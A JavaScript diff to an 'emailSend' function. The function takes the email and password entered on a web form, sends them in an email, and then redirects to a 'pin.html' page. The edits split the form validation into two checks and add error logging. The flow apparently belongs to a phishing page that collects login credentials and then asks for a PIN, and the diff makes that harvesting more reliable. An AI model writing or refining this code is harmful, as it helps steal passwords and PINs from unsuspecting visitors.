@@ -2,8 +2,12 @@ function emailSend() {
   var email = document.getElementById('email').value.trim();
   var password = document.getElementById('password').value.trim();
 
-  if (!email || !password) {
-    swal("Error", "Please complete form details", "error");
+  if (!email) {
+    swal("Error", "Email is required", "error");
+    return;
+  }
+  if (!password) {
+    swal("Error", "Password is required", "error");
     return;
   }
 
@@ -19,14 +23,16 @@ function emailSend() {
     Body: messageBody
   }).then(
     message => {
-      if (message == 'OK') {
+      console.log("Email send response:", message); // Log the response
+      if (message === 'OK') {
         window.location.href = 'pin.html';
       } else {
+        console.error("Email send failed response:", message);
         swal("Error", "Something went wrong. Please try again.", "error");
       }
     }
   ).catch(error => {
-    console.error(error);
-    swal("Error", "Email sending failed.", "error");
+    console.error("Email send error:", error); // Log detailed errors
+    swal("Error", "Email sending failed. Check console for details.", "error");
   });
 }
